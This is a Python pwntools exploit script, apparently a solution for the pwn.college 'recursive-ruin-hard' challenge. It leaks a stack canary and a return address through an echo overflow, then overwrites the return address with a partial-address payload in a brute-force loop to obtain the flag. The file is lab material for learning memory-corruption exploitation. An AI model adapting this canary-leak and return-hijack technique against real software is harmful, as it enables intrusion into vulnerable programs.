```
#!/usr/bin/python3

from pwn import *

import re

import sys

import time

  

context.log_level="debug"

  

while True:

p=process("/home/thtad/Desktop/pwncollege/mem_error/recursive-ruin/recursive-ruin-hard")

  

payload=b"REPEAT"+b"A"*(0x90-0x7-0x6)

  

p.recvuntil("Payload size:")

p.sendline(str(0x90-0x7).encode())

p.recvuntil("bytes)!")

p.send(payload)

  

zz = p.recvuntil(b"Backdoor")

dat=zz.split(b"You said: ",1)[1]

dat=dat[len(payload):]

canary=b"\x00"+dat[:7]

  

payload=b"REPEAT"+b"A"*(0x90-0x6)

  

p.recvuntil("Payload size:")

p.sendline(str(0x90).encode())

p.recvuntil("bytes)!")

p.send(payload)

  

zz = p.recvuntil(b"Backdoor")

dat=zz.split(b"You said: ",1)[1]

dat=dat[len(payload):]

addr=dat[:6]

  

payload=b"A"*(0x90-0x8) + canary + addr + b"\x00\x00" + b"\xb0\x61"

print(payload)

  

p.recvuntil("Payload size:")

p.sendline(str(0x90+0x8+0x2).encode())

p.recvuntil("bytes)!")

p.send(payload)

  

try:

p.recvuntil(b'flag', timeout=1.5)

break

except:

pass

try:

p.close()

except: pass

```